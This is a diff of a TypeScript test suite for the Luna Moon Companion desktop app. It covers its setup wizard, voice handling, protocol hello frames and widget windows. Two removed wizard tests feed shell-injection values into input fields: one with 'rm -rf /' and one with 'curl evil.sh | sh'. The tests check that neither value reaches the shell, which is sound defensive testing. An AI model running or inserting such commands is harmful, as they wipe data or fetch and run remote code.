-      const status = document.getElementById('wizard-connect-status')!
-      expect(status.classList.contains('fail')).toBe(true)
-      expect(status.textContent).toContain('doesn’t sound like Luna')
-    })
-
-    it('Scenario: fresh Mac -> install runs the real steps in order and starts the server', async () => {
-      const commands: string[] = []
-      let healthzCalls = 0
-      stubCore((cmd, args) => {
-        if (cmd !== 'local_shell_exec') return undefined
-        const c = args.command as string
-        commands.push(c)
-        if (c.includes('healthz')) {
-          healthzCalls++
-          // 1st = detection probe (no server), 2nd = wake-step probe (still
-          // none → must start), 3rd+ = heartbeat after start (alive).
-          return { exitCode: healthzCalls >= 3 ? 0 : 1, stdout: '', stderr: '', durationMs: 4, timedOut: false }
-        }
-        if (c.includes('"$HOME/luna/.git" ]')) {
-          return { exitCode: 1, stdout: '', stderr: '', durationMs: 1, timedOut: false } // no repo yet
-        }
-        return { exitCode: 0, stdout: 'ok', stderr: '', durationMs: 5, timedOut: false }
+    it('hello caches advertised model ids to localStorage luna_available_models', () => {
+      M().handleFrame({
+        type: 'hello', protocolVersion: 2, capabilities: {},
+        availableModels: [{ id: 'm-1', label: 'One' }, { id: 'm-2' }, { bogus: true }],
       })
-
-      W().open()
-      await W()._detectPromise
-      expect(W().env).toEqual({ serverRunning: false, repoExists: false })
-      // Fresh Mac → no detection banner, install wording.
-      expect((document.getElementById('wizard-detect-note') as HTMLElement).hidden).toBe(true)
-      expect(document.getElementById('wizard-local-start')!.textContent).toBe('Install & start')
-
-      W().choosePath('local')
-      await W().runLocalInstall()
-
-      expect(activeStep()).toBe('progress')
-      // Order of operations (after the 2 detection probes): git check → bun
-      // check → clone → bun install → ~/.luna seed → wake probe → start → heartbeat.
-      const install = commands.slice(2)
-      expect(install[0]).toContain('command -v git')
-      expect(install[1]).toContain('command -v bun')
-      expect(install[2]).toContain('git clone https://github.com/fourcolors/luna.git')
-      expect(install[2]).toContain('LUNA_DIR="$HOME/luna"')   // ~ expanded by the SHELL
-      expect(install[3]).toContain('bun install')
-      expect(install[4]).toContain('LUNA_REPO_ROOT')
-      // UI_WS_TOKEN is a HARD boot requirement (resolveUiWsToken throws) — a
-      // fresh install must mint one or the launchd server crash-loops and the
-      // heartbeat times out. Existing tokens are preserved (grep -q guard).
-      expect(install[4]).toContain('grep -q "^UI_WS_TOKEN="')
-      expect(install[4]).toContain('openssl rand -hex 24')
-      // Every command gets the PATH prelude (a .app inherits launchd's PATH).
-      for (const c of commands) expect(c).toContain('$HOME/.bun/bin')
-
-      // No server answered the wake probe ⇒ the supervised start actually ran:
-      // the shared plist lib is sourced, the plist lands where launchd rescans
-      // at login (survives reboot), and bootstrap+kickstart bring her up.
-      const wake = commands.find((c) => c.includes('launchctl bootstrap'))!
-      expect(wake).toBeTruthy()
-      expect(wake).toContain('scripts/lib/launchd-plist.sh')
-      expect(wake).toContain('Library/LaunchAgents')
-      expect(wake).toContain('com.user.luna-chat-server')
-      expect(wake).toContain('launchctl kickstart')
-      // The unsupervised nohup start is gone for good.
-      expect(commands.some((c) => c.includes('nohup'))).toBe(false)
-      // Fresh install never pauses an old server.
-      expect(commands.some((c) => c.includes('pkill'))).toBe(false)
-
-      const rows = Array.from(document.querySelectorAll('#wizard-progress-list .wizard-task'))
-      expect(rows).toHaveLength(7)
-      expect(rows.every((r) => r.classList.contains('ok'))).toBe(true)
-      expect((document.getElementById('wizard-progress-next') as HTMLElement).hidden).toBe(false)
+      expect(JSON.parse(localStorage.getItem('luna_available_models')!)).toEqual(['m-1', 'm-2'])
     })
 
-    it('Scenario: Luna already lives here -> update mode (settle-pause + restart, update wording, connect shortcut)', async () => {
-      const commands: string[] = []
-      stubCore((cmd, args) => {
-        if (cmd !== 'local_shell_exec') return undefined
-        const c = args.command as string
-        commands.push(c)
-        return { exitCode: 0, stdout: 'ok', stderr: '', durationMs: 5, timedOut: false } // server up, repo present
-      })
-
-      W().open()
-      await W()._detectPromise
-      expect(W().env).toEqual({ serverRunning: true, repoExists: true })
-
-      // The path step announces the find; the local step speaks "update".
-      const note = document.getElementById('wizard-detect-note') as HTMLElement
-      expect(note.hidden).toBe(false)
-      expect(note.textContent).toContain('already running')
-      expect(document.getElementById('wizard-path-local-desc')!.textContent).toContain('update')
-
-      W().choosePath('local')
-      expect(document.getElementById('wizard-local-title')!.textContent).toContain('Update Luna')
-      expect(document.getElementById('wizard-local-start')!.textContent).toBe('Update & restart')
-      expect((document.getElementById('wizard-local-connect') as HTMLElement).hidden).toBe(false)
-
-      await W().runLocalInstall()
-
-      // Update flow: pull (not a fresh clone path choice — same command, repo
-      // branch wins), settle-pause the old server, then a supervised restart.
-      // The pause MUST bootout the LaunchAgent BEFORE the 6s settle (else
-      // KeepAlive respawns the old server mid-settle) and still pkill-sweeps
-      // legacy nohup-era servers.
-      const pause = commands.find((c) => c.includes('sleep 6'))!
-      expect(pause).toBeTruthy()
-      expect(pause.indexOf('launchctl bootout')).toBeGreaterThanOrEqual(0)
-      expect(pause.indexOf('launchctl bootout')).toBeLessThan(pause.indexOf('sleep 6'))
-      expect(pause).toContain('pkill -f "ui-web.*server:chat"')
-      expect(commands.some((c) => c.includes('launchctl bootstrap') && c.includes('launchctl kickstart'))).toBe(true)
-      expect(commands.some((c) => c.includes('nohup'))).toBe(false)
-
-      const rows = Array.from(document.querySelectorAll('#wizard-progress-list .wizard-task'))
-      expect(rows).toHaveLength(8)                            // + "Tucking the old Luna in"
-      expect(rows.every((r) => r.classList.contains('ok'))).toBe(true)
+    it('hello with a buildSha reveals the header build label; absent hides it again', () => {
+      M().handleFrame({ type: 'hello', protocolVersion: 2, capabilities: {}, buildSha: 'abc1234' })
+      const el = document.getElementById('build-sha') as HTMLElement
+      expect(el.hidden).toBe(false)
+      expect(el.textContent).toBe('build abc1234')
+      M().handleFrame({ type: 'hello', protocolVersion: 2, capabilities: {} })
+      expect(el.hidden).toBe(true)
     })
 
-    it('Scenario: "Just connect to it" shortcut jumps to connect prefilled with localhost', async () => {
-      stubCore((cmd) => (cmd === 'local_shell_exec'
-        ? { exitCode: 0, stdout: '', stderr: '', durationMs: 2, timedOut: false }
-        : undefined))
-      W().open()
-      await W()._detectPromise
-      W().choosePath('local')
-      const shortcut = document.getElementById('wizard-local-connect') as HTMLElement
-      expect(shortcut.hidden).toBe(false)
-      shortcut.click()
-      expect(activeStep()).toBe('connect')
-      expect((document.getElementById('wizard-connect-url') as HTMLInputElement).value)
-        .toBe('ws://127.0.0.1:4753/ui')
-
-      // Back from here must return to the local FORM, not an empty progress
-      // screen — no install run ever happened on this path.
-      document.getElementById('wizard-connect-back')!.click()
-      expect(activeStep()).toBe('local')
+    it('a protocol-version MISMATCH warns loudly but keeps chatting enabled (idempotent banner)', () => {
+      M().handleFrame({ type: 'hello', protocolVersion: 99, capabilities: {} })
+      const statusEl = document.getElementById('connection-status')!
+      expect(statusEl.className).toBe('version-warning')
+      expect(statusEl.textContent).toContain('v99')
+      expect(document.getElementById('protocol-mismatch-banner')).not.toBeNull()
+      // Reconnects re-deliver hello — no duplicate banners.
+      M().handleFrame({ type: 'hello', protocolVersion: 99, capabilities: {} })
+      expect(document.querySelectorAll('#protocol-mismatch-banner').length).toBe(1)
     })
 
-    it('Scenario: local install failure paints the bead red, shows the log, and offers Back', async () => {
-      stubCore((cmd) => {
-        if (cmd !== 'local_shell_exec') return undefined
-        return { exitCode: 1, stdout: '', stderr: 'sh: git: command not found', durationMs: 3, timedOut: false }
-      })
-
-      W().open()
-      W().choosePath('local')
-      await W().runLocalInstall()
-
-      const rows = Array.from(document.querySelectorAll('#wizard-progress-list .wizard-task'))
-      expect(rows[0].classList.contains('fail')).toBe(true)
-      expect(rows[1].classList.contains('ok')).toBe(false)   // never reached
-      const log = document.getElementById('wizard-progress-log') as HTMLElement
-      expect(log.hidden).toBe(false)
-      expect(log.textContent).toContain('git: command not found')
-      expect((document.getElementById('wizard-progress-back') as HTMLElement).hidden).toBe(false)
-      expect((document.getElementById('wizard-progress-next') as HTMLElement).hidden).toBe(true)
-    })
-
-    it('Scenario: a hostile install folder is rejected before any install command runs', async () => {
-      const invoke = stubCore(() => ({ exitCode: 0, stdout: '', stderr: '', durationMs: 1, timedOut: false }))
-      W().open()
-      await W()._detectPromise                               // detection probes are read-only
-      W().choosePath('local')
-      ;(document.getElementById('wizard-local-dir') as HTMLInputElement).value = '~/luna"; rm -rf /; "'
-      await W().runLocalInstall()
-      // No mutating install command ever reached the shell (detection's two
-      // read-only probes are the only local_shell_exec calls).
-      const shellCmds = invoke.mock.calls
-        .filter((c: any[]) => c[0] === 'local_shell_exec')
-        .map((c: any[]) => c[1].command as string)
-      expect(shellCmds.some((c) => c.includes('git clone') || c.includes('launchctl') || c.includes('mkdir'))).toBe(false)
-      expect(activeStep()).toBe('local')                     // still on the form
-    })
-
-    it('Scenario: arriving at connect on the local path reads UI_WS_TOKEN into the secret field', async () => {
-      stubCore((cmd, args) => {
-        if (cmd !== 'local_shell_exec') return undefined
-        const c = args.command as string
-        if (c.includes('grep "^UI_WS_TOKEN=')) {
-          return { exitCode: 0, stdout: 'UI_WS_TOKEN=tok_abc123456789\n', stderr: '', durationMs: 2, timedOut: false }
-        }
-        return { exitCode: 1, stdout: '', stderr: '', durationMs: 1, timedOut: false }
-      })
-      W().open()
-      W().chosenPath = 'local'
-      const tokenInput = document.getElementById('wizard-connect-token') as HTMLInputElement
-      tokenInput.value = ''
-      W().goTo('connect')
-      for (let i = 0; i < 6; i++) await Promise.resolve()
-      expect(tokenInput.value).toBe('tok_abc123456789')
-    })
-
-    it('Scenario: a token the user already typed is never overwritten by the .env read', async () => {
-      stubCore((cmd, args) => {
-        if (cmd !== 'local_shell_exec') return undefined
-        const c = args.command as string
-        if (c.includes('grep "^UI_WS_TOKEN=')) {
-          return { exitCode: 0, stdout: 'UI_WS_TOKEN=from-env-file\n', stderr: '', durationMs: 2, timedOut: false }
-        }
-        return { exitCode: 1, stdout: '', stderr: '', durationMs: 1, timedOut: false }
-      })
-      W().open()
-      W().chosenPath = 'local'
-      const tokenInput = document.getElementById('wizard-connect-token') as HTMLInputElement
-      tokenInput.value = 'my-own-secret'
-      W().goTo('connect')
-      for (let i = 0; i < 6; i++) await Promise.resolve()
-      expect(tokenInput.value).toBe('my-own-secret')
-    })
-
-    it('Scenario: remote step writes a tailored install one-liner and prefills the connect URL', () => {
-      stubCore(() => undefined)
-      W().open()
-      W().choosePath('remote')
-
-      const host = document.getElementById('wizard-remote-host') as HTMLInputElement
-      host.value = 'root@moonbase'
-      host.dispatchEvent(new Event('input', { bubbles: true }))
-
-      const cmd = document.getElementById('wizard-remote-cmd')!.textContent!
-      expect(cmd).toContain('ssh -t root@moonbase')
-      expect(cmd).toContain('git clone https://github.com/fourcolors/luna.git')
-      expect(cmd).toContain('luna-server-install')
-      expect(cmd).toContain('UI_WS_TOKEN')                   // surfaces the token to paste back
-
-      document.getElementById('wizard-remote-continue')!.click()
-      expect(activeStep()).toBe('connect')
-      expect((document.getElementById('wizard-connect-url') as HTMLInputElement).value)
-        .toBe('ws://moonbase:4753/ui')                       // user@ stripped, ws guessed
-    })
-
-    it('Scenario: an ssh destination with quotes/spaces never reaches the generated one-liner', () => {
-      stubCore(() => undefined)
-      W().open()
-      W().choosePath('remote')
-
-      const host = document.getElementById('wizard-remote-host') as HTMLInputElement
-      host.value = `bad host'; curl evil.sh | sh; '`
-      host.dispatchEvent(new Event('input', { bubbles: true }))
-
-      const cmd = document.getElementById('wizard-remote-cmd')!.textContent!
-      expect(cmd).toContain('ssh -t user@your-server')       // placeholder fallback
-      expect(cmd).not.toContain('evil.sh')
-      expect(W()._remoteWsGuess).toBe('')                    // no bogus prefill either
-    })
-
-    // The wizard re-entry button (#open-wizard-btn) moved to the standalone
-    // Connection panel — its wiring is covered in test/panel-connection.test.ts.
-  })
-
-  // ───────────────────────────────────────────────────────────────────────────
-  // Behavioral Feature: Voice — sentence splitter (pure function, VOICE.md)
-  // ───────────────────────────────────────────────────────────────────────────
-  describe('Feature: Voice sentence splitter (pure)', () => {
-    const split = (s: string) => (window as any).__MoonInternals.splitSpeakableSentences(s)
-
-    it('splits complete sentences and keeps the trailing fragment as rest', () => {
-      const r = split('Hello there. How are you? I am')
-      expect(r.sentences).toEqual(['Hello there.', 'How are you?'])
-      expect(r.rest).toBe('I am')
-    })
-
-    it('does NOT split an abbrev-ish short fragment (<2 words before the boundary)', () => {
-      const r = split('Dr. Smith is here. Good')
-      // "Dr." alone is 1 word -> no boundary; the real sentence end splits.
-      expect(r.sentences).toEqual(['Dr. Smith is here.'])
-      expect(r.rest).toBe('Good')
-    })
-
-    it('treats a closing quote after the terminator as part of the sentence', () => {
-      const r = split('He said "stop here." Then left.')
-      expect(r.sentences).toEqual(['He said "stop here."'])
-      // End-of-buffer is NOT a boundary (a decimal or more text may follow).
-      expect(r.rest).toBe('Then left.')
-    })
-
-    it('treats a closing paren after the terminator as part of the sentence', () => {
-      const r = split('It works (mostly.) And then some')
-      expect(r.sentences).toEqual(['It works (mostly.)'])
-      expect(r.rest).toBe('And then some')
-    })
-
-    it('never splits inside an unclosed ``` fence', () => {
-      const r = split('Here is code. ```python\nx = 1. y. z')
-      expect(r.sentences).toEqual(['Here is code.'])
-      expect(r.rest).toBe('```python\nx = 1. y. z')
-    })
-
-    it('splits after a fence CLOSES, keeping the whole block in one chunk', () => {
-      const r = split('Look at this. ```js\nfoo(); // first. second\n``` All done. Next')
-      expect(r.sentences).toEqual([
-        'Look at this.',
-        '```js\nfoo(); // first. second\n``` All done.',
-      ])
-      expect(r.rest).toBe('Next')
-    })
-
-    it('does not treat a decimal point as a boundary', () => {
-      const r = split('The value is 3.14 and rising. ok')
-      expect(r.sentences).toEqual(['The value is 3.14 and rising.'])
-      expect(r.rest).toBe('ok')
-    })
-
-    it('end-of-buffer terminator stays in rest (flush on message end handles it)', () => {
-      const r = split('Working on it.')
-      expect(r.sentences).toEqual([])
-      expect(r.rest).toBe('Working on it.')
-    })
-
-    // Regression (finding: table announced once per row): rows are protected
-    // like fences so the whole table lands in ONE chunk → ONE announcement.
-    it('never splits inside markdown table rows (cells with sentence punctuation)', () => {
-      const r = split('| Tool | Use it. Often. |\n| Saw | Cuts wood. Slowly. |\nAll covered. next')
-      expect(r.sentences).toEqual([
-        '| Tool | Use it. Often. |\n| Saw | Cuts wood. Slowly. |\nAll covered.',
-      ])
-      expect(r.rest).toBe('next')
-    })
-
-    it('a still-streaming table row stays whole in rest', () => {
-      const r = split('| name | description. with periods |')
-      expect(r.sentences).toEqual([])
-      expect(r.rest).toBe('| name | description. with periods |')
-    })
-
-    it('mid-line pipes are NOT table rows (only a line-leading | protects)', () => {
-      // toSpeakable's table collapse also requires (^|\n) before the pipe —
-      // the splitter must use the same definition so the two stay in sync.
-      const r = split('Sure thing. | a. b | more. tail')
-      expect(r.sentences[0]).toBe('Sure thing.')
+    it('an older server with NO protocolVersion gets one soft note, never a hard banner', () => {
+      M().handleFrame({ type: 'hello', capabilities: {} })
+      M().handleFrame({ type: 'hello', capabilities: {} })
+      expect(document.getElementById('protocol-mismatch-banner')).toBeNull()
+      const notes = Array.from(document.querySelectorAll('#chat-messages .msg.assistant'))
+        .filter((n) => n.textContent!.includes('older server'))
+      expect(notes.length).toBe(1)
     })
   })
 
   // ───────────────────────────────────────────────────────────────────────────
-  // Behavioral Feature: Voice — speakable filter (pure function, VOICE.md)
-  // ───────────────────────────────────────────────────────────────────────────
-  describe('Feature: Voice speakable filter (pure)', () => {
-    const speak = (s: string) => (window as any).__MoonInternals.toSpeakable(s)
-    const CODE_MSG = "I've put the code in the chat."
-    const TABLE_MSG = "There's a table in the chat."
-
-    it('replaces a fenced code block with the code announcement', () => {
-      expect(speak('Here:\n```js\nconst a = 1;\n```\nDone'))
-        .toBe(`Here: ${CODE_MSG} Done`)
-    })
-
-    it('announces a CONSECUTIVE run of fenced blocks only once', () => {
-      const out = speak('```a\nx\n```\n\n```b\ny\n```')
-      expect(out).toBe(CODE_MSG)
-    })
-
-    it('announces two runs separated by prose twice', () => {
-      const out = speak('```a\nx\n``` then words ```b\ny\n```')
-      expect(out.split(CODE_MSG).length - 1).toBe(2)
-      expect(out).toContain('then words')
-    })
-
-    it('announces an unclosed (mid-stream flushed) fence too', () => {
-      expect(speak('Partial ```python\nx = 1')).toBe(`Partial ${CODE_MSG}`)
-    })
-
-    it('speaks inline code as its literal text', () => {
-      expect(speak('Run `bun install` now')).toBe('Run bun install now')
-    })
-
-    it('speaks links as their link text only', () => {
-      expect(speak('See [the docs](https://example.com) please')).toBe('See the docs please')
-    })
-
-    it('speaks images as their alt text', () => {
-      expect(speak('![a moon](moon.png) rises')).toBe('a moon rises')
-    })
-
-    it('strips heading, list, and emphasis markers', () => {
-      expect(speak('## Heading\n- item one\n**bold** and _quiet_')).toBe('Heading item one bold and quiet')
-    })
-
-    it('strips blockquote markers', () => {
-      expect(speak('> quoted wisdom here')).toBe('quoted wisdom here')
-    })
-
-    it('replaces a table with the table announcement', () => {
-      expect(speak('| a | b |\n|---|---|\n| 1 | 2 |')).toBe(TABLE_MSG)
-    })
-
-    it('strips emoji', () => {
-      expect(speak('Done! 🎉🚀')).toBe('Done!')
-    })
-
-    it('returns empty string when nothing speakable remains (caller skips speak_text)', () => {
-      expect(speak('🎉  \n  ')).toBe('')
-    })
-  })
-
-  // ───────────────────────────────────────────────────────────────────────────
-  // Behavioral Feature: Voice — transcript routing (fill/append + auto-send)
+  // Behavioral Feature: Voice — transcript routing into the EXACT send path
   // ───────────────────────────────────────────────────────────────────────────
   describe('Feature: Voice transcript routing', () => {
     const M = () => (window as any).__MoonInternals
@@ -3145,38 +2020,7 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
   })
 
   // ───────────────────────────────────────────────────────────────────────────
-  // Behavioral Feature: Voice — state events drive the moon + mic visuals
-  // ───────────────────────────────────────────────────────────────────────────
-  describe('Feature: Voice state -> moon visuals (data-voice-state)', () => {
-    const V = () => (window as any).__MoonInternals.VoiceEngine
-
-    it('Scenario: listening sets dataset.voiceState and the --voice-level CSS var (clamped)', () => {
-      const wrapper = document.getElementById('moon-wrapper')!
-      const mic = document.getElementById('voice-mic-btn')!
-
-      V().onStateEvent({ state: 'listening', mode: 'auto', level: 0.5 })
-      expect(wrapper.dataset.voiceState).toBe('listening')
-      expect(wrapper.style.getPropertyValue('--voice-level')).toBe('0.5')
-      expect(mic.dataset.voiceState).toBe('listening')
-
-      V().onStateEvent({ state: 'listening', mode: 'auto', level: 3 })
-      expect(wrapper.style.getPropertyValue('--voice-level')).toBe('1')
-    })
-
-    it('Scenario: transcribing and speaking map through; off clears to ""', () => {
-      const wrapper = document.getElementById('moon-wrapper')!
-      V().onStateEvent({ state: 'transcribing', mode: 'auto' })
-      expect(wrapper.dataset.voiceState).toBe('transcribing')
-      V().onStateEvent({ state: 'speaking', mode: 'auto' })
-      expect(wrapper.dataset.voiceState).toBe('speaking')
-      V().onStateEvent({ state: 'off', mode: 'off' })
-      expect(wrapper.dataset.voiceState).toBe('')
-      expect(document.getElementById('voice-mic-btn')!.dataset.voiceState).toBe('')
-    })
-  })
-
-  // ───────────────────────────────────────────────────────────────────────────
-  // Behavioral Feature: Voice — Settings → Voice persistence + boot re-apply
+  // Behavioral Feature: Voice — persisted settings load
   // ───────────────────────────────────────────────────────────────────────────
   describe('Feature: Voice settings persistence', () => {
     const M = () => (window as any).__MoonInternals
@@ -3340,16 +2184,14 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
   })
 
   // ───────────────────────────────────────────────────────────────────────────
-  // Behavioral Feature: Voice — availability probe + boot wiring
+  // Behavioral Feature: Voice — availability probe + boot wiring (chat window).
+  // Voice events arrive WINDOW-TARGETED here (getCurrentWindow().listen), not
+  // via the global event API — they are broadcast app-wide by the Rust core.
   // ───────────────────────────────────────────────────────────────────────────
-  describe('Feature: Voice availability + boot wiring', () => {
+  describe('Feature: Voice availability + boot wiring (chat window)', () => {
     const M = () => (window as any).__MoonInternals
 
-    // The settings-side degradation (disabled controls, unavailable note,
-    // model download row) moved to the voice panel: test/panel-voice.test.ts.
-    // Here we pin the hub-side half — the mic button and the engine flag.
-
-    it('Scenario: without a Tauri voice backend the hub degrades (mic hidden, engine unavailable)', () => {
+    it('Scenario: without a Tauri voice backend the window degrades (mic hidden, engine unavailable)', () => {
       // The shared beforeEach has no __TAURI__.core: VoiceEngine.init() lands
       // in "unavailable" synchronously at boot.
       expect(M().VoiceEngine.available).toBe(false)
@@ -3366,68 +2208,47 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
       expect(invoke.mock.calls.map((c) => c[0])).toEqual(['voice_status'])
     })
 
-    it('Scenario: with a voice backend, boot probes status, subscribes events, re-applies persisted settings, lists voices', async () => {
+    it('Scenario: with a voice backend, boot probes status, subscribes WINDOW-TARGETED events, re-applies persisted settings', async () => {
       localStorage.setItem('luna_voice_mode', 'auto')
       localStorage.setItem('luna_voice_silence_hang_ms', '800')
-      const handlers: Record<string, (e: any) => void> = {}
       const invoke = vi.fn(async (cmd: string) => {
         if (cmd === 'voice_status') return { state: 'idle', mode: 'off', modelPresent: true }
-        if (cmd === 'voice_list_voices') return [{ id: 'v1', name: 'Samantha', lang: 'en-US', quality: 'enhanced' }]
         return null
       })
-      const listen = vi.fn(async (name: string, cb: any) => { handlers[name] = cb; return () => {} })
       ;(window as any).__TAURI__.core = { invoke }
-      ;(window as any).__TAURI__.event = { listen }
 
       await M().VoiceEngine.init()
 
       expect(invoke).toHaveBeenCalledWith('voice_status')
       expect(invoke).toHaveBeenCalledWith('voice_set_mode', { mode: 'auto' })
       expect(invoke).toHaveBeenCalledWith('voice_set_config', { silenceHangMs: 800 })
-      expect(Object.keys(handlers)).toEqual(expect.arrayContaining([
-        'voice-state', 'voice-transcript', 'voice-model-progress', 'voice-error',
+      // Voice events ride getCurrentWindow().listen — window-targeted, no
+      // model-progress here (that is the settings.voice panel's concern).
+      expect(Object.keys(windowEventHandlers)).toEqual(expect.arrayContaining([
+        'voice-state', 'voice-transcript', 'voice-error',
       ]))
+      expect(windowEventHandlers['voice-model-progress']).toBeUndefined()
       expect(document.getElementById('voice-mic-btn')!.hidden).toBe(false)
-      // (Model-status text + voice-picker rendering moved to the voice panel:
-      // test/panel-voice.test.ts.)
 
       // A captured voice-transcript event routes through the real send path.
       const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
       M().State.activeThreadId = 'th-boot'
-      handlers['voice-transcript']({ payload: { text: 'hello from voice', final: true } })
+      M().VoiceEngine.micPaused = false
+      windowEventHandlers['voice-transcript']({ payload: { text: 'hello from voice', final: true } })
       expect(sendSpy).toHaveBeenCalledWith(expect.objectContaining({
         type: 'user-message', text: 'hello from voice',
       }))
     })
 
-    // The model download bar / Download-button re-arm UI moved to the voice
-    // panel — covered in test/panel-voice.test.ts (voice-model-progress tests).
-
-    // Regression (finding: after model download the pipeline stayed off while
-    // the UI showed Hands-free active): mod.rs's contract is "the frontend
-    // drives voice_ensure_model first, then RETRIES" — so a successful
-    // download must re-apply the chosen mode.
-    it('Scenario: a successful model download re-applies the chosen voice mode', async () => {
-      const invoke = vi.fn(async (cmd: string, args?: any) => {
-        if (cmd === 'voice_set_mode') {
-          return { state: 'idle', mode: args.mode, modelPresent: true, silenceHangMs: 600 }
-        }
-        return null
-      })
-      ;(window as any).__TAURI__.core = { invoke }
+    it('Scenario: voice-state events drive the MIC visuals (no moon wrapper in this window)', () => {
       const V = M().VoiceEngine
-      V.available = true
-      V.mode = 'auto'
-      V.micPaused = true   // the refused pre-download set_mode parked the mic
-
-      await V.startModelDownload()
-
-      expect(invoke).toHaveBeenCalledWith('voice_ensure_model')
-      expect(invoke).toHaveBeenCalledWith('voice_set_mode', { mode: 'auto' })
-      expect(V.micPaused).toBe(false)
-      expect(V.rustMode).toBe('auto')
-      // (The "Model ready" status text now renders in the voice panel:
-      // test/panel-voice.test.ts.)
+      const mic = document.getElementById('voice-mic-btn')!
+      V.onStateEvent({ state: 'listening', mode: 'auto', level: 0.5 })
+      expect(mic.dataset.voiceState).toBe('listening')
+      V.onStateEvent({ state: 'speaking', mode: 'auto' })
+      expect(mic.dataset.voiceState).toBe('speaking')
+      V.onStateEvent({ state: 'off', mode: 'off' })
+      expect(mic.dataset.voiceState).toBe('')
     })
 
     // Regression (finding: inverted first mic click): when Rust REFUSES a
@@ -3445,7 +2266,7 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
       const V = M().VoiceEngine
       V.available = true
 
-      V.setMode('auto')                          // user clicks Hands-free, no model yet
+      V.setMode('auto')                          // user picked Hands-free, no model yet
       await Promise.resolve(); await Promise.resolve(); await Promise.resolve()
       expect(V.micPaused).toBe(true)
       expect(V.rustMode).toBe('off')
@@ -3454,6 +2275,16 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
       V.onMicClick()                             // first click must START voice…
       expect(invoke).toHaveBeenCalledWith('voice_set_mode', { mode: 'auto' })
       expect(invoke).not.toHaveBeenCalledWith('voice_set_mode', { mode: 'off' })  // …not "pause" it
+    })
+
+    it('Scenario: mic click while voice is OFF opens the settings.voice panel (discoverability)', () => {
+      const invoke = vi.fn(async () => null)
+      ;(window as any).__TAURI__.core = { invoke }
+      const V = M().VoiceEngine
+      V.available = true
+      V.mode = 'off'
+      document.getElementById('voice-mic-btn')!.dispatchEvent(new MouseEvent('click', { bubbles: true }))
+      expect(invoke).toHaveBeenCalledWith('open_widget', { kind: 'settings.voice' })
     })
   })
 
@@ -3717,6 +2548,7 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
     })
   })
 
+  // ───────────────────────────────────────────────────────────────────────────
   // Behavioral Feature: Workflows gallery panel (PRD Part C W3)
   // ───────────────────────────────────────────────────────────────────────────
   describe('Feature: Workflows gallery', () => {
@@ -3842,73 +2674,168 @@ describe('Luna Moon Companion - Behavioral Driven Tests', () => {
   })
 
   // ───────────────────────────────────────────────────────────────────────────
-  // Behavioral Feature: Settings tabs that migrated to system widgets (Phase 2)
+  // Feature: widget-window chrome + the hub-event return channel. The window
+  // follows panel.html's conventions (close_widget, LunaDock.wire) and acts on
+  // window-targeted hub-events with the dock-group `for:` discipline.
   // ───────────────────────────────────────────────────────────────────────────
-  describe('Feature: Summon-by-name (widget directory + widget-open)', () => {
+  describe('Feature: widget-window chrome + hub-event return channel', () => {
     const M = () => (window as any).__MoonInternals
 
-    it('hello announces the widget directory from the shipped registry', async () => {
-      const m = M()
-      const sent: any[] = []
-      m.WebSocketEngine.send = (f: any) => { sent.push(f) }
-      m.State.ws = { readyState: WebSocket.OPEN }
-      // The harness has no network: serve the real registry file via a fetch mock.
-      const registry = JSON.parse(
-        fs.readFileSync(path.resolve(__dirname, '../frontend/vendor/widget-registry.json'), 'utf8'))
-      ;(window as any).fetch = vi.fn(async () => ({ json: async () => registry }))
-
-      m.WebSocketEngine.handleFrame({
-        type: 'hello', protocolVersion: 2, kinds: [],
-        capabilities: { chat: true, streamingDeltas: true },
-      })
-      await vi.waitFor(() => expect(sent.some((f) => f.type === 'widget-directory')).toBe(true))
-      const dir = sent.find((f) => f.type === 'widget-directory')
-      expect(dir.widgets.map((w: any) => w.kind)).toContain('settings.voice')
-      expect(dir.widgets.every((w: any) => typeof w.description === 'string')).toBe(true)
-      delete (window as any).fetch
+    beforeEach(() => {
+      ;(window as any).requestAnimationFrame = (cb: FrameRequestCallback) => { cb(0); return 1 }
+      ;(window as any).cancelAnimationFrame = () => {}
+      M().ChatState.reset()
     })
 
-    it('widget-open dispatches to the Rust open_widget command (registry-validated there)', async () => {
-      const m = M()
-      const invoke = vi.fn(async () => 'panel-settings-voice')
+    it('✕ closes via close_widget with this window label', () => {
+      const invoke = vi.fn(async () => null)
       ;(window as any).__TAURI__.core = { invoke }
-      m.WebSocketEngine.handleFrame({ type: 'widget-open', kind: 'settings.voice' })
-      await vi.waitFor(() =>
-        expect(invoke).toHaveBeenCalledWith('open_widget', { kind: 'settings.voice' }))
-      // Malformed frames never reach invoke.
-      invoke.mockClear()
-      m.WebSocketEngine.handleFrame({ type: 'widget-open' })
-      expect(invoke).not.toHaveBeenCalled()
+      document.getElementById('close-btn')!.click()
+      expect(invoke).toHaveBeenCalledWith('close_widget', { label: 'chat-test' })
+    })
+
+    it('the GEAR opens the settings launcher widget', () => {
+      const invoke = vi.fn(async () => null)
+      ;(window as any).__TAURI__.core = { invoke }
+      document.getElementById('toggle-settings')!.click()
+      expect(invoke).toHaveBeenCalledWith('open_widget', { kind: 'settings' })
+    })
+
+    it('the GEAR degrades to a no-op off-Tauri (no core) without throwing', () => {
+      expect(() => document.getElementById('toggle-settings')!.click()).not.toThrow()
+    })
+
+    it("hub-event 'fresh-thread' addressed to THIS window starts a new conversation", async () => {
+      const m = M()
+      m.State.activeThreadId = 'th-old'
+      expect(windowEventHandlers['hub-event']).toBeTypeOf('function')
+      windowEventHandlers['hub-event']({ payload: { for: 'chat-test', name: 'fresh-thread' } })
+      await Promise.resolve()
+      await Promise.resolve()
+      expect(m.State.activeThreadId).toBeNull()
+      expect(document.getElementById('chat-messages')!.textContent)
+        .toContain('New conversation started')
+    })
+
+    it('hub-events addressed to OTHER windows are ignored (for-discipline)', async () => {
+      const m = M()
+      m.State.activeThreadId = 'th-keep'
+      windowEventHandlers['hub-event']({ payload: { for: 'chat-other', name: 'fresh-thread' } })
+      await Promise.resolve()
+      await Promise.resolve()
+      expect(m.State.activeThreadId).toBe('th-keep')
+    })
+
+    it('an unknown hub-event name is ignored without throwing', async () => {
+      expect(() => {
+        windowEventHandlers['hub-event']({ payload: { for: 'chat-test', name: 'mystery-action' } })
+      }).not.toThrow()
+      await Promise.resolve()
+    })
+
